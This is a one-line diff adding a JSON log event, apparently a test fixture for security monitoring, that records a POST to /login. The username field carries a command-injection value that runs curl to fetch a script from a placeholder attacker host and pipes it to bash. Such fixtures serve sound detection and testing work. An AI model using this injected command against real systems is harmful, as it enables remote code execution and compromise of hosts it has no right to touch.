@@ -1,0 +1,1 @@
+{"@timestamp":"2026-09-16T10:00:00.000Z","event_type":"http_request","source_ip":"10.0.0.1","dest_ip":"10.0.0.2","http_method":"POST","url":"/login","username":"victima; curl http://attacker.example/x.sh | bash","credential_submission":true,"user_agent":"curl/8.0","tags":["web","credential_submission"],"source_type":"network_traffic"}
